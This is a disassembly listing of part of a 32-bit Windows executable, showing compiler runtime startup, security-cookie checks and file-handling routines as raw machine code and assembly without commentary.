  406785:	ff 75 08             	push   0x8(%ebp)
  406788:	ff 15 58 90 40 00    	call   *0x409058
  40678e:	89 06                	mov    %eax,(%esi)
  406790:	83 f8 ff             	cmp    $0xffffffff,%eax
  406793:	75 2f                	jne    0x4067c4
  406795:	ff 15 60 90 40 00    	call   *0x409060
  40679b:	83 f8 32             	cmp    $0x32,%eax
  40679e:	74 05                	je     0x4067a5
  4067a0:	83 f8 57             	cmp    $0x57,%eax
  4067a3:	75 21                	jne    0x4067c6
  4067a5:	57                   	push   %edi
  4067a6:	57                   	push   %edi
  4067a7:	57                   	push   %edi
  4067a8:	ff 75 10             	push   0x10(%ebp)
  4067ab:	57                   	push   %edi
  4067ac:	ff 75 08             	push   0x8(%ebp)
  4067af:	ff 15 58 90 40 00    	call   *0x409058
  4067b5:	89 06                	mov    %eax,(%esi)
  4067b7:	83 f8 ff             	cmp    $0xffffffff,%eax
  4067ba:	75 08                	jne    0x4067c4
  4067bc:	ff 15 60 90 40 00    	call   *0x409060
  4067c2:	eb 02                	jmp    0x4067c6
  4067c4:	33 c0                	xor    %eax,%eax
  4067c6:	5f                   	pop    %edi
  4067c7:	5e                   	pop    %esi
  4067c8:	5d                   	pop    %ebp
  4067c9:	c2 0c 00             	ret    $0xc
  4067cc:	53                   	push   %ebx
  4067cd:	8b dc                	mov    %esp,%ebx
  4067cf:	51                   	push   %ecx
  4067d0:	51                   	push   %ecx
  4067d1:	83 e4 f8             	and    $0xfffffff8,%esp
  4067d4:	83 c4 04             	add    $0x4,%esp
  4067d7:	55                   	push   %ebp
  4067d8:	8b 6b 04             	mov    0x4(%ebx),%ebp
  4067db:	89 6c 24 04          	mov    %ebp,0x4(%esp)
  4067df:	8b ec                	mov    %esp,%ebp
  4067e1:	83 ec 68             	sub    $0x68,%esp
  4067e4:	a1 04 c0 40 00       	mov    0x40c004,%eax
  4067e9:	33 c5                	xor    %ebp,%eax
  4067eb:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4067ee:	8b 4b 10             	mov    0x10(%ebx),%ecx
  4067f1:	8a c1                	mov    %cl,%al
  4067f3:	56                   	push   %esi
  4067f4:	8b 73 08             	mov    0x8(%ebx),%esi
  4067f7:	24 01                	and    $0x1,%al
  4067f9:	83 e1 fe             	and    $0xfffffffe,%ecx
  4067fc:	88 45 a7             	mov    %al,-0x59(%ebp)
  4067ff:	89 4b 10             	mov    %ecx,0x10(%ebx)
  406802:	57                   	push   %edi
  406803:	8b 7b 0c             	mov    0xc(%ebx),%edi
  406806:	84 c0                	test   %al,%al
  406808:	74 11                	je     0x40681b
  40680a:	8b c1                	mov    %ecx,%eax
  40680c:	c1 e8 02             	shr    $0x2,%eax
  40680f:	a8 01                	test   $0x1,%al
  406811:	74 08                	je     0x40681b
  406813:	6a 57                	push   $0x57
  406815:	58                   	pop    %eax
  406816:	e9 8b 01 00 00       	jmp    0x4069a6
  40681b:	8b 53 14             	mov    0x14(%ebx),%edx
  40681e:	8b c1                	mov    %ecx,%eax
  406820:	d1 e8                	shr    $1,%eax
  406822:	a8 01                	test   $0x1,%al
  406824:	74 20                	je     0x406846
  406826:	83 fa ff             	cmp    $0xffffffff,%edx
  406829:	74 1b                	je     0x406846
  40682b:	8b c2                	mov    %edx,%eax
  40682d:	c1 e8 0a             	shr    $0xa,%eax
  406830:	a8 01                	test   $0x1,%al
  406832:	8a 45 a7             	mov    -0x59(%ebp),%al
  406835:	74 04                	je     0x40683b
  406837:	84 c0                	test   %al,%al
  406839:	75 0e                	jne    0x406849
  40683b:	83 e1 fd             	and    $0xfffffffd,%ecx
  40683e:	89 57 10             	mov    %edx,0x10(%edi)
  406841:	89 4b 10             	mov    %ecx,0x10(%ebx)
  406844:	eb 03                	jmp    0x406849
  406846:	8a 45 a7             	mov    -0x59(%ebp),%al
  406849:	85 c9                	test   %ecx,%ecx
  40684b:	0f 84 53 01 00 00    	je     0x4069a4
  406851:	f6 c1 2a             	test   $0x2a,%cl
  406854:	74 6b                	je     0x4068c1
  406856:	83 fa ff             	cmp    $0xffffffff,%edx
  406859:	74 0c                	je     0x406867
  40685b:	c1 ea 0a             	shr    $0xa,%edx
  40685e:	f6 c2 01             	test   $0x1,%dl
  406861:	74 04                	je     0x406867
  406863:	84 c0                	test   %al,%al
  406865:	75 5a                	jne    0x4068c1
  406867:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40686a:	50                   	push   %eax
  40686b:	6a 00                	push   $0x0
  40686d:	56                   	push   %esi
  40686e:	ff 15 44 90 40 00    	call   *0x409044
  406874:	85 c0                	test   %eax,%eax
  406876:	75 0b                	jne    0x406883
  406878:	ff 15 60 90 40 00    	call   *0x409060
  40687e:	e9 23 01 00 00       	jmp    0x4069a6
  406883:	80 7d a7 00          	cmpb   $0x0,-0x59(%ebp)
  406887:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40688a:	74 09                	je     0x406895
  40688c:	8b c1                	mov    %ecx,%eax
  40688e:	c1 e8 0a             	shr    $0xa,%eax
  406891:	a8 01                	test   $0x1,%al
  406893:	75 29                	jne    0x4068be
  406895:	33 c0                	xor    %eax,%eax
  406897:	89 4f 10             	mov    %ecx,0x10(%edi)
  40689a:	03 45 f4             	add    -0xc(%ebp),%eax
  40689d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4068a0:	83 d1 00             	adc    $0x0,%ecx
  4068a3:	89 47 08             	mov    %eax,0x8(%edi)
  4068a6:	83 63 10 d5          	andl   $0xffffffd5,0x10(%ebx)
  4068aa:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4068ad:	89 4f 0c             	mov    %ecx,0xc(%edi)
  4068b0:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4068b3:	89 07                	mov    %eax,(%edi)
  4068b5:	89 4f 04             	mov    %ecx,0x4(%edi)
  4068b8:	0f 84 e6 00 00 00    	je     0x4069a4
  4068be:	8a 45 a7             	mov    -0x59(%ebp),%al
  4068c1:	0f b6 c0             	movzbl %al,%eax
  4068c4:	83 f0 01             	xor    $0x1,%eax
  4068c7:	83 c0 10             	add    $0x10,%eax
  4068ca:	c1 e0 15             	shl    $0x15,%eax
  4068cd:	50                   	push   %eax
  4068ce:	68 80 00 00 00       	push   $0x80
  4068d3:	56                   	push   %esi
  4068d4:	8d 45 98             	lea    -0x68(%ebp),%eax
  4068d7:	50                   	push   %eax
  4068d8:	e8 de 00 00 00       	call   0x4069bb
  4068dd:	8b 75 98             	mov    -0x68(%ebp),%esi
  4068e0:	89 45 a0             	mov    %eax,-0x60(%ebp)
  4068e3:	85 c0                	test   %eax,%eax
  4068e5:	74 07                	je     0x4068ee
  4068e7:	8b f8                	mov    %eax,%edi
  4068e9:	e9 ac 00 00 00       	jmp    0x40699a
  4068ee:	8b 43 10             	mov    0x10(%ebx),%eax
  4068f1:	83 f8 06             	cmp    $0x6,%eax
  4068f4:	74 3e                	je     0x406934
  4068f6:	a8 22                	test   $0x22,%al
  4068f8:	74 3a                	je     0x406934
  4068fa:	6a 28                	push   $0x28
  4068fc:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4068ff:	50                   	push   %eax
  406900:	6a 00                	push   $0x0
  406902:	56                   	push   %esi
  406903:	ff 15 00 90 40 00    	call   *0x409000
  406909:	85 c0                	test   %eax,%eax
  40690b:	75 0d                	jne    0x40691a
  40690d:	ff 15 60 90 40 00    	call   *0x409060
  406913:	8b f8                	mov    %eax,%edi
  406915:	e9 80 00 00 00       	jmp    0x40699a
  40691a:	8b 45 c8             	mov    -0x38(%ebp),%eax
  40691d:	8b 4d bc             	mov    -0x44(%ebp),%ecx
  406920:	89 47 10             	mov    %eax,0x10(%edi)
  406923:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406926:	89 07                	mov    %eax,(%edi)
  406928:	8b 43 10             	mov    0x10(%ebx),%eax
  40692b:	83 e0 dd             	and    $0xffffffdd,%eax
  40692e:	89 4f 04             	mov    %ecx,0x4(%edi)
  406931:	89 43 10             	mov    %eax,0x10(%ebx)
  406934:	a8 06                	test   $0x6,%al
  406936:	74 28                	je     0x406960
  406938:	6a 08                	push   $0x8
  40693a:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40693d:	50                   	push   %eax
  40693e:	6a 09                	push   $0x9
  406940:	56                   	push   %esi
  406941:	ff 15 00 90 40 00    	call   *0x409000
  406947:	85 c0                	test   %eax,%eax
  406949:	74 c2                	je     0x40690d
  40694b:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40694e:	89 47 10             	mov    %eax,0x10(%edi)
  406951:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406954:	89 47 14             	mov    %eax,0x14(%edi)
  406957:	8b 43 10             	mov    0x10(%ebx),%eax
  40695a:	83 e0 f9             	and    $0xfffffff9,%eax
  40695d:	89 43 10             	mov    %eax,0x10(%ebx)
  406960:	a8 18                	test   $0x18,%al
  406962:	74 2b                	je     0x40698f
  406964:	6a 18                	push   $0x18
  406966:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406969:	50                   	push   %eax
  40696a:	6a 01                	push   $0x1
  40696c:	56                   	push   %esi
  40696d:	ff 15 00 90 40 00    	call   *0x409000
  406973:	85 c0                	test   %eax,%eax
  406975:	74 96                	je     0x40690d
  406977:	8b 45 e8             	mov    -0x18(%ebp),%eax
  40697a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40697d:	89 47 08             	mov    %eax,0x8(%edi)
  406980:	8b 45 f0             	mov    -0x10(%ebp),%eax
  406983:	89 47 18             	mov    %eax,0x18(%edi)
  406986:	8b 43 10             	mov    0x10(%ebx),%eax
  406989:	89 4f 0c             	mov    %ecx,0xc(%edi)
  40698c:	83 e0 e7             	and    $0xffffffe7,%eax
  40698f:	85 c0                	test   %eax,%eax
  406991:	75 04                	jne    0x406997
  406993:	33 ff                	xor    %edi,%edi
  406995:	eb 03                	jmp    0x40699a
  406997:	6a 32                	push   $0x32
  406999:	5f                   	pop    %edi
  40699a:	56                   	push   %esi
  40699b:	e8 f7 fb ff ff       	call   0x406597
  4069a0:	8b c7                	mov    %edi,%eax
  4069a2:	eb 02                	jmp    0x4069a6
  4069a4:	33 c0                	xor    %eax,%eax
  4069a6:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4069a9:	5f                   	pop    %edi
  4069aa:	33 cd                	xor    %ebp,%ecx
  4069ac:	5e                   	pop    %esi
  4069ad:	e8 c7 00 00 00       	call   0x406a79
  4069b2:	8b e5                	mov    %ebp,%esp
  4069b4:	5d                   	pop    %ebp
  4069b5:	8b e3                	mov    %ebx,%esp
  4069b7:	5b                   	pop    %ebx
  4069b8:	c2 10 00             	ret    $0x10
  4069bb:	55                   	push   %ebp
  4069bc:	8b ec                	mov    %esp,%ebp
  4069be:	56                   	push   %esi
  4069bf:	33 f6                	xor    %esi,%esi
  4069c1:	56                   	push   %esi
  4069c2:	ff 75 14             	push   0x14(%ebp)
  4069c5:	6a 03                	push   $0x3
  4069c7:	56                   	push   %esi
  4069c8:	6a 07                	push   $0x7
  4069ca:	ff 75 10             	push   0x10(%ebp)
  4069cd:	ff 75 0c             	push   0xc(%ebp)
  4069d0:	ff 15 50 90 40 00    	call   *0x409050
  4069d6:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4069d9:	89 01                	mov    %eax,(%ecx)
  4069db:	83 f8 ff             	cmp    $0xffffffff,%eax
  4069de:	75 08                	jne    0x4069e8
  4069e0:	ff 15 60 90 40 00    	call   *0x409060
  4069e6:	8b f0                	mov    %eax,%esi
  4069e8:	8b c6                	mov    %esi,%eax
  4069ea:	5e                   	pop    %esi
  4069eb:	5d                   	pop    %ebp
  4069ec:	c2 10 00             	ret    $0x10
  4069ef:	56                   	push   %esi
  4069f0:	57                   	push   %edi
  4069f1:	8b 79 04             	mov    0x4(%ecx),%edi
  4069f4:	8b 07                	mov    (%edi),%eax
  4069f6:	8b 70 08             	mov    0x8(%eax),%esi
  4069f9:	8b ce                	mov    %esi,%ecx
  4069fb:	ff 15 10 92 40 00    	call   *0x409210
  406a01:	8b cf                	mov    %edi,%ecx
  406a03:	ff d6                	call   *%esi
  406a05:	8b f8                	mov    %eax,%edi
  406a07:	85 ff                	test   %edi,%edi
  406a09:	74 12                	je     0x406a1d
  406a0b:	8b 0f                	mov    (%edi),%ecx
  406a0d:	6a 01                	push   $0x1
  406a0f:	8b 31                	mov    (%ecx),%esi
  406a11:	8b ce                	mov    %esi,%ecx
  406a13:	ff 15 10 92 40 00    	call   *0x409210
  406a19:	8b cf                	mov    %edi,%ecx
  406a1b:	ff d6                	call   *%esi
  406a1d:	5f                   	pop    %edi
  406a1e:	5e                   	pop    %esi
  406a1f:	c3                   	ret
  406a20:	56                   	push   %esi
  406a21:	eb 18                	jmp    0x406a3b
  406a23:	8b 06                	mov    (%esi),%eax
  406a25:	8b ce                	mov    %esi,%ecx
  406a27:	a3 18 c4 40 00       	mov    %eax,0x40c418
  406a2c:	e8 be ff ff ff       	call   0x4069ef
  406a31:	6a 08                	push   $0x8
  406a33:	56                   	push   %esi
  406a34:	e8 83 00 00 00       	call   0x406abc
  406a39:	59                   	pop    %ecx
  406a3a:	59                   	pop    %ecx
  406a3b:	8b 35 18 c4 40 00    	mov    0x40c418,%esi
  406a41:	85 f6                	test   %esi,%esi
  406a43:	75 de                	jne    0x406a23
  406a45:	5e                   	pop    %esi
  406a46:	c3                   	ret
  406a47:	55                   	push   %ebp
  406a48:	8b ec                	mov    %esp,%ebp
  406a4a:	51                   	push   %ecx
  406a4b:	6a 08                	push   $0x8
  406a4d:	e8 35 00 00 00       	call   0x406a87
  406a52:	89 45 fc             	mov    %eax,-0x4(%ebp)
  406a55:	59                   	pop    %ecx
  406a56:	85 c0                	test   %eax,%eax
  406a58:	74 10                	je     0x406a6a
  406a5a:	8b 0d 18 c4 40 00    	mov    0x40c418,%ecx
  406a60:	89 08                	mov    %ecx,(%eax)
  406a62:	8b 4d 08             	mov    0x8(%ebp),%ecx
  406a65:	89 48 04             	mov    %ecx,0x4(%eax)
  406a68:	eb 02                	jmp    0x406a6c
  406a6a:	33 c0                	xor    %eax,%eax
  406a6c:	a3 18 c4 40 00       	mov    %eax,0x40c418
  406a71:	c9                   	leave
  406a72:	c3                   	ret
  406a73:	ff 25 6c 90 40 00    	jmp    *0x40906c
  406a79:	3b 0d 04 c0 40 00    	cmp    0x40c004,%ecx
  406a7f:	75 01                	jne    0x406a82
  406a81:	c3                   	ret
  406a82:	e9 33 05 00 00       	jmp    0x406fba
  406a87:	55                   	push   %ebp
  406a88:	8b ec                	mov    %esp,%ebp
  406a8a:	eb 0d                	jmp    0x406a99
  406a8c:	ff 75 08             	push   0x8(%ebp)
  406a8f:	e8 2c 0c 00 00       	call   0x4076c0
  406a94:	59                   	pop    %ecx
  406a95:	85 c0                	test   %eax,%eax
  406a97:	74 0f                	je     0x406aa8
  406a99:	ff 75 08             	push   0x8(%ebp)
  406a9c:	e8 19 0c 00 00       	call   0x4076ba
  406aa1:	59                   	pop    %ecx
  406aa2:	85 c0                	test   %eax,%eax
  406aa4:	74 e6                	je     0x406a8c
  406aa6:	5d                   	pop    %ebp
  406aa7:	c3                   	ret
  406aa8:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  406aac:	0f 84 1e a6 ff ff    	je     0x4010d0
  406ab2:	e9 15 06 00 00       	jmp    0x4070cc
  406ab7:	e9 f8 0b 00 00       	jmp    0x4076b4
  406abc:	55                   	push   %ebp
  406abd:	8b ec                	mov    %esp,%ebp
  406abf:	ff 75 08             	push   0x8(%ebp)
  406ac2:	e8 f0 ff ff ff       	call   0x406ab7
  406ac7:	59                   	pop    %ecx
  406ac8:	5d                   	pop    %ebp
  406ac9:	c3                   	ret
  406aca:	55                   	push   %ebp
  406acb:	8b ec                	mov    %esp,%ebp
  406acd:	f6 45 08 01          	testb  $0x1,0x8(%ebp)
  406ad1:	56                   	push   %esi
  406ad2:	8b f1                	mov    %ecx,%esi
  406ad4:	c7 06 54 93 40 00    	movl   $0x409354,(%esi)
  406ada:	74 0a                	je     0x406ae6
  406adc:	6a 0c                	push   $0xc
  406ade:	56                   	push   %esi
  406adf:	e8 d8 ff ff ff       	call   0x406abc
  406ae4:	59                   	pop    %ecx
  406ae5:	59                   	pop    %ecx
  406ae6:	8b c6                	mov    %esi,%eax
  406ae8:	5e                   	pop    %esi
  406ae9:	5d                   	pop    %ebp
  406aea:	c2 04 00             	ret    $0x4
  406aed:	56                   	push   %esi
  406aee:	6a 01                	push   $0x1
  406af0:	e8 d7 0b 00 00       	call   0x4076cc
  406af5:	e8 8e 06 00 00       	call   0x407188
  406afa:	50                   	push   %eax
  406afb:	e8 02 0c 00 00       	call   0x407702
  406b00:	e8 7c 06 00 00       	call   0x407181
  406b05:	8b f0                	mov    %eax,%esi
  406b07:	e8 26 0c 00 00       	call   0x407732
  406b0c:	6a 01                	push   $0x1
  406b0e:	89 30                	mov    %esi,(%eax)
  406b10:	e8 d8 02 00 00       	call   0x406ded
  406b15:	83 c4 0c             	add    $0xc,%esp
  406b18:	5e                   	pop    %esi
  406b19:	84 c0                	test   %al,%al
  406b1b:	74 73                	je     0x406b90
  406b1d:	db e2                	fnclex
  406b1f:	e8 a7 08 00 00       	call   0x4073cb
  406b24:	68 f7 73 40 00       	push   $0x4073f7
  406b29:	e8 4c 04 00 00       	call   0x406f7a
  406b2e:	e8 51 06 00 00       	call   0x407184
  406b33:	50                   	push   %eax
  406b34:	e8 9f 0b 00 00       	call   0x4076d8
  406b39:	59                   	pop    %ecx
  406b3a:	59                   	pop    %ecx
  406b3b:	85 c0                	test   %eax,%eax
  406b3d:	75 51                	jne    0x406b90
  406b3f:	e8 4a 06 00 00       	call   0x40718e
  406b44:	e8 9e 06 00 00       	call   0x4071e7
  406b49:	85 c0                	test   %eax,%eax
  406b4b:	74 0b                	je     0x406b58
  406b4d:	68 81 71 40 00       	push   $0x407181
  406b52:	e8 7b 0b 00 00       	call   0x4076d2
  406b57:	59                   	pop    %ecx
  406b58:	e8 32 04 00 00       	call   0x406f8f
  406b5d:	e8 2d 04 00 00       	call   0x406f8f
  406b62:	e8 36 06 00 00       	call   0x40719d
  406b67:	e8 15 06 00 00       	call   0x407181
  406b6c:	50                   	push   %eax
  406b6d:	e8 b4 0b 00 00       	call   0x407726
  406b72:	59                   	pop    %ecx
  406b73:	e8 22 06 00 00       	call   0x40719a
  406b78:	84 c0                	test   %al,%al
  406b7a:	74 05                	je     0x406b81
  406b7c:	e8 5d 0b 00 00       	call   0x4076de
  406b81:	e8 fb 05 00 00       	call   0x407181
  406b86:	e8 8f 07 00 00       	call   0x40731a
  406b8b:	85 c0                	test   %eax,%eax
  406b8d:	75 01                	jne    0x406b90
  406b8f:	c3                   	ret
  406b90:	6a 07                	push   $0x7
  406b92:	e8 68 06 00 00       	call   0x4071ff
  406b97:	cc                   	int3
  406b98:	e8 2d 06 00 00       	call   0x4071ca
  406b9d:	33 c0                	xor    %eax,%eax
  406b9f:	c3                   	ret
  406ba0:	e8 bc 07 00 00       	call   0x407361
  406ba5:	e8 d7 05 00 00       	call   0x407181
  406baa:	50                   	push   %eax
  406bab:	e8 7c 0b 00 00       	call   0x40772c
  406bb0:	59                   	pop    %ecx
  406bb1:	c3                   	ret
  406bb2:	6a 14                	push   $0x14
  406bb4:	68 30 a9 40 00       	push   $0x40a930
  406bb9:	e8 72 08 00 00       	call   0x407430
  406bbe:	6a 01                	push   $0x1
  406bc0:	e8 ef 01 00 00       	call   0x406db4
  406bc5:	59                   	pop    %ecx
  406bc6:	84 c0                	test   %al,%al
  406bc8:	0f 84 50 01 00 00    	je     0x406d1e
  406bce:	32 db                	xor    %bl,%bl
  406bd0:	88 5d e7             	mov    %bl,-0x19(%ebp)
  406bd3:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406bd7:	e8 a6 01 00 00       	call   0x406d82
  406bdc:	88 45 dc             	mov    %al,-0x24(%ebp)
  406bdf:	a1 20 c4 40 00       	mov    0x40c420,%eax
  406be4:	33 c9                	xor    %ecx,%ecx
  406be6:	41                   	inc    %ecx
  406be7:	3b c1                	cmp    %ecx,%eax
  406be9:	0f 84 2f 01 00 00    	je     0x406d1e
  406bef:	85 c0                	test   %eax,%eax
  406bf1:	75 49                	jne    0x406c3c
  406bf3:	89 0d 20 c4 40 00    	mov    %ecx,0x40c420
  406bf9:	68 34 92 40 00       	push   $0x409234
  406bfe:	68 28 92 40 00       	push   $0x409228
  406c03:	e8 e8 0a 00 00       	call   0x4076f0
  406c08:	59                   	pop    %ecx
  406c09:	59                   	pop    %ecx
  406c0a:	85 c0                	test   %eax,%eax
  406c0c:	74 11                	je     0x406c1f
  406c0e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406c15:	b8 ff 00 00 00       	mov    $0xff,%eax
  406c1a:	e9 ef 00 00 00       	jmp    0x406d0e
  406c1f:	68 24 92 40 00       	push   $0x409224
  406c24:	68 18 92 40 00       	push   $0x409218
  406c29:	e8 bc 0a 00 00       	call   0x4076ea
  406c2e:	59                   	pop    %ecx
  406c2f:	59                   	pop    %ecx
  406c30:	c7 05 20 c4 40 00 02 	movl   $0x2,0x40c420
  406c37:	00 00 00 
  406c3a:	eb 05                	jmp    0x406c41
  406c3c:	8a d9                	mov    %cl,%bl
  406c3e:	88 5d e7             	mov    %bl,-0x19(%ebp)
  406c41:	ff 75 dc             	push   -0x24(%ebp)
  406c44:	e8 bf 02 00 00       	call   0x406f08
  406c49:	59                   	pop    %ecx
  406c4a:	e8 a4 05 00 00       	call   0x4071f3
  406c4f:	8b f0                	mov    %eax,%esi
  406c51:	33 ff                	xor    %edi,%edi
  406c53:	39 3e                	cmp    %edi,(%esi)
  406c55:	74 1b                	je     0x406c72
  406c57:	56                   	push   %esi
  406c58:	e8 17 02 00 00       	call   0x406e74
  406c5d:	59                   	pop    %ecx
  406c5e:	84 c0                	test   %al,%al
  406c60:	74 10                	je     0x406c72
  406c62:	8b 36                	mov    (%esi),%esi
  406c64:	57                   	push   %edi
  406c65:	6a 02                	push   $0x2
  406c67:	57                   	push   %edi
  406c68:	8b ce                	mov    %esi,%ecx
  406c6a:	ff 15 10 92 40 00    	call   *0x409210
  406c70:	ff d6                	call   *%esi
  406c72:	e8 82 05 00 00       	call   0x4071f9
  406c77:	8b f0                	mov    %eax,%esi
  406c79:	39 3e                	cmp    %edi,(%esi)
  406c7b:	74 13                	je     0x406c90
  406c7d:	56                   	push   %esi
  406c7e:	e8 f1 01 00 00       	call   0x406e74
  406c83:	59                   	pop    %ecx
  406c84:	84 c0                	test   %al,%al
  406c86:	74 08                	je     0x406c90
  406c88:	ff 36                	push   (%esi)
  406c8a:	e8 91 0a 00 00       	call   0x407720
  406c8f:	59                   	pop    %ecx
  406c90:	e8 4f 0a 00 00       	call   0x4076e4
  406c95:	8b f8                	mov    %eax,%edi
  406c97:	e8 72 0a 00 00       	call   0x40770e
  406c9c:	8b 30                	mov    (%eax),%esi
  406c9e:	e8 65 0a 00 00       	call   0x407708
  406ca3:	57                   	push   %edi
  406ca4:	56                   	push   %esi
  406ca5:	ff 30                	push   (%eax)
  406ca7:	e8 84 ca ff ff       	call   0x403730
  406cac:	83 c4 0c             	add    $0xc,%esp
  406caf:	8b f0                	mov    %eax,%esi
  406cb1:	e8 69 06 00 00       	call   0x40731f
  406cb6:	84 c0                	test   %al,%al
  406cb8:	74 6b                	je     0x406d25
  406cba:	84 db                	test   %bl,%bl
  406cbc:	75 05                	jne    0x406cc3
  406cbe:	e8 51 0a 00 00       	call   0x407714
  406cc3:	6a 00                	push   $0x0
  406cc5:	6a 01                	push   $0x1
  406cc7:	e8 59 02 00 00       	call   0x406f25
  406ccc:	59                   	pop    %ecx
  406ccd:	59                   	pop    %ecx
  406cce:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406cd5:	8b c6                	mov    %esi,%eax
  406cd7:	eb 35                	jmp    0x406d0e
  406cd9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406cdc:	8b 01                	mov    (%ecx),%eax
  406cde:	8b 00                	mov    (%eax),%eax
  406ce0:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406ce3:	51                   	push   %ecx
  406ce4:	50                   	push   %eax
  406ce5:	e8 dc 09 00 00       	call   0x4076c6
  406cea:	59                   	pop    %ecx
  406ceb:	59                   	pop    %ecx
  406cec:	c3                   	ret
  406ced:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406cf0:	e8 2a 06 00 00       	call   0x40731f
  406cf5:	84 c0                	test   %al,%al
  406cf7:	74 32                	je     0x406d2b
  406cf9:	80 7d e7 00          	cmpb   $0x0,-0x19(%ebp)
  406cfd:	75 05                	jne    0x406d04
  406cff:	e8 16 0a 00 00       	call   0x40771a
  406d04:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406d0b:	8b 45 e0             	mov    -0x20(%ebp),%eax
  406d0e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d11:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406d18:	59                   	pop    %ecx
  406d19:	5f                   	pop    %edi
  406d1a:	5e                   	pop    %esi
  406d1b:	5b                   	pop    %ebx
  406d1c:	c9                   	leave
  406d1d:	c3                   	ret
  406d1e:	6a 07                	push   $0x7
  406d20:	e8 da 04 00 00       	call   0x4071ff
  406d25:	56                   	push   %esi
  406d26:	e8 cb 09 00 00       	call   0x4076f6
  406d2b:	ff 75 e0             	push   -0x20(%ebp)
  406d2e:	e8 c9 09 00 00       	call   0x4076fc
  406d33:	cc                   	int3
  406d34:	e8 fd 03 00 00       	call   0x407136
  406d39:	e9 74 fe ff ff       	jmp    0x406bb2
  406d3e:	55                   	push   %ebp
  406d3f:	8b ec                	mov    %esp,%ebp
  406d41:	8b 45 08             	mov    0x8(%ebp),%eax
  406d44:	56                   	push   %esi
  406d45:	8b 48 3c             	mov    0x3c(%eax),%ecx
  406d48:	03 c8                	add    %eax,%ecx
  406d4a:	0f b7 41 14          	movzwl 0x14(%ecx),%eax
  406d4e:	8d 51 18             	lea    0x18(%ecx),%edx
  406d51:	03 d0                	add    %eax,%edx
  406d53:	0f b7 41 06          	movzwl 0x6(%ecx),%eax
  406d57:	6b f0 28             	imul   $0x28,%eax,%esi
  406d5a:	03 f2                	add    %edx,%esi
  406d5c:	3b d6                	cmp    %esi,%edx
  406d5e:	74 19                	je     0x406d79
  406d60:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  406d63:	3b 4a 0c             	cmp    0xc(%edx),%ecx
  406d66:	72 0a                	jb     0x406d72
  406d68:	8b 42 08             	mov    0x8(%edx),%eax
  406d6b:	03 42 0c             	add    0xc(%edx),%eax
  406d6e:	3b c8                	cmp    %eax,%ecx
  406d70:	72 0c                	jb     0x406d7e
  406d72:	83 c2 28             	add    $0x28,%edx
  406d75:	3b d6                	cmp    %esi,%edx
  406d77:	75 ea                	jne    0x406d63
  406d79:	33 c0                	xor    %eax,%eax
  406d7b:	5e                   	pop    %esi
  406d7c:	5d                   	pop    %ebp
  406d7d:	c3                   	ret
  406d7e:	8b c2                	mov    %edx,%eax
  406d80:	eb f9                	jmp    0x406d7b
  406d82:	56                   	push   %esi
  406d83:	e8 f0 08 00 00       	call   0x407678
  406d88:	85 c0                	test   %eax,%eax
  406d8a:	74 20                	je     0x406dac
  406d8c:	64 a1 18 00 00 00    	mov    %fs:0x18,%eax
  406d92:	be 24 c4 40 00       	mov    $0x40c424,%esi
  406d97:	8b 50 04             	mov    0x4(%eax),%edx
  406d9a:	eb 04                	jmp    0x406da0
  406d9c:	3b d0                	cmp    %eax,%edx
  406d9e:	74 10                	je     0x406db0
  406da0:	33 c0                	xor    %eax,%eax
  406da2:	8b ca                	mov    %edx,%ecx
  406da4:	f0 0f b1 0e          	lock cmpxchg %ecx,(%esi)
  406da8:	85 c0                	test   %eax,%eax
  406daa:	75 f0                	jne    0x406d9c
  406dac:	32 c0                	xor    %al,%al
  406dae:	5e                   	pop    %esi
  406daf:	c3                   	ret
  406db0:	b0 01                	mov    $0x1,%al
  406db2:	5e                   	pop    %esi
  406db3:	c3                   	ret
  406db4:	55                   	push   %ebp
  406db5:	8b ec                	mov    %esp,%ebp
  406db7:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  406dbb:	75 07                	jne    0x406dc4
  406dbd:	c6 05 28 c4 40 00 01 	movb   $0x1,0x40c428
  406dc4:	e8 db 06 00 00       	call   0x4074a4
  406dc9:	e8 cc 03 00 00       	call   0x40719a
  406dce:	84 c0                	test   %al,%al
  406dd0:	75 04                	jne    0x406dd6
  406dd2:	32 c0                	xor    %al,%al
  406dd4:	5d                   	pop    %ebp
  406dd5:	c3                   	ret
  406dd6:	e8 bf 03 00 00       	call   0x40719a
  406ddb:	84 c0                	test   %al,%al
  406ddd:	75 0a                	jne    0x406de9
  406ddf:	6a 00                	push   $0x0
  406de1:	e8 b4 03 00 00       	call   0x40719a
  406de6:	59                   	pop    %ecx
  406de7:	eb e9                	jmp    0x406dd2
  406de9:	b0 01                	mov    $0x1,%al
  406deb:	5d                   	pop    %ebp
  406dec:	c3                   	ret
  406ded:	55                   	push   %ebp
  406dee:	8b ec                	mov    %esp,%ebp
  406df0:	80 3d 29 c4 40 00 00 	cmpb   $0x0,0x40c429
  406df7:	74 04                	je     0x406dfd
  406df9:	b0 01                	mov    $0x1,%al
  406dfb:	5d                   	pop    %ebp
  406dfc:	c3                   	ret
  406dfd:	56                   	push   %esi
  406dfe:	8b 75 08             	mov    0x8(%ebp),%esi
  406e01:	85 f6                	test   %esi,%esi
  406e03:	74 05                	je     0x406e0a
